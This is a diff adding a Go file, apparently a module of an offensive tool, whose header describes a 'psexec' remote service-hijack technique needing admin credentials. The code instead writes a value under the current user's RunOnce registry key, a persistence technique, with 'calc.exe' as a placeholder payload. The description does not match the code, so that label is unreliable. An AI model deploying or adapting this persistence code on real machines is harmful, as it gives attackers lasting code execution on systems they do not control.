@@ -1,0 +1,81 @@
+/*{
+Name: psexec
+Author: TerminalJockey
+Description: modifies service executable on target machine, and starts service gaining code execution.Requires valid admin creds.
+Options:
+Filepath
+Keyname
+}*
+
+package main
+
+import (
+	"fmt"
+	"log"
+	"syscall"
+	"unsafe"
+)
+
+var (
+	modadvapi32         = syscall.NewLazyDLL("advapi32.dll")
+	procRegCreateKeyExW = modadvapi32.NewProc("RegCreateKeyExW")
+	procRegSetValueExW  = modadvapi32.NewProc("RegSetValueExW")
+)
+
+func main() {
+	var keyhandle syscall.Handle
+	subkey, err := syscall.UTF16PtrFromString("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce")
+	if err != nil {
+		log.Println(err)
+	}
+
+	err = syscall.RegOpenKeyEx(syscall.HKEY_CURRENT_USER, subkey, 0, syscall.KEY_ALL_ACCESS, &keyhandle)
+	if err != nil {
+		log.Println(err)
+	}
+	fmt.Println(keyhandle)
+
+	var lpName [50]uint16
+	lpSize := uint32(len(lpName))
+	err = syscall.RegEnumKeyEx(keyhandle, 1, &lpName[0], &lpSize, nil, nil, nil, nil)
+	if err != nil {
+		log.Println(err)
+	}
+
+	err = setStringValue(keyhandle, "", syscall.REG_SZ, "calc.exe")
+	if err != nil {
+		log.Println(err)
+	}
+
+	kname := syscall.UTF16ToString(lpName[:])
+	fmt.Println(kname)
+
+}
+
+func regSetValueEx(key syscall.Handle, valueName *uint16, reserved uint32, vtype uint32, buf *byte, bufsize uint32) (regerrno error) {
+	r0, _, _ := syscall.Syscall6(procRegSetValueExW.Addr(), 6, uintptr(key), uintptr(unsafe.Pointer(valueName)), uintptr(reserved), uintptr(vtype), uintptr(unsafe.Pointer(buf)), uintptr(bufsize))
+	if r0 != 0 {
+		regerrno = syscall.Errno(r0)
+	}
+	return
+}
+
+func setValue(k syscall.Handle, name string, valtype uint32, data []byte) error {
+	p, err := syscall.UTF16PtrFromString(name)
+	if err != nil {
+		return err
+	}
+	if len(data) == 0 {
+		return regSetValueEx(syscall.Handle(k), p, 0, valtype, nil, 0)
+	}
+	return regSetValueEx(syscall.Handle(k), p, 0, valtype, &data[0], uint32(len(data)))
+}
+
+func setStringValue(k syscall.Handle, name string, valtype uint32, value string) error {
+	v, err := syscall.UTF16FromString(value)
+	if err != nil {
+		return err
+	}
+	buf := (*[1 << 29]byte)(unsafe.Pointer(&v[0]))[: len(v)*2 : len(v)*2]
+	return setValue(k, name, valtype, buf)
+}
